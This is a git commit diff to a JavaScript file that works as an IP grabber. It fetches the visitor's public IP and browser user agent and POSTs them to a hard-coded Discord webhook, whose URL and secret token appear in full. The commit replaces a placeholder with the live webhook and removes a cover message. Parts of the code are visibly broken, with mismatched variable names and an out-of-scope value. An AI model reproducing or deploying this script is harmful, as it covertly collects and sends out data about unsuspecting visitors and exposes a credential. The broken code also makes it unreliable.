462720d358f4ae8eabff26996276cd077567834d
PastebinNotAvaliable <132144508+PasteBinNotAvailable@users.noreply.github.com>
2023-06-22 13:35:19 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,10 +1,10 @@
 fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
-   .then(data => console.log("Information was verifed."));
+   .then(data => { var script = data.ip });
    var agent = navigator.userAgent;
-   var valid = data.ip + " " + agent;
+   var valid = script + " " + agent;
    const xml = new XMLHttpRequest;
-   request.open("POST", "/*Replace with your own Discord webhook*/");
+   request.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");
 
    request.setRequestHeader('Content-type', 'application/json');
 
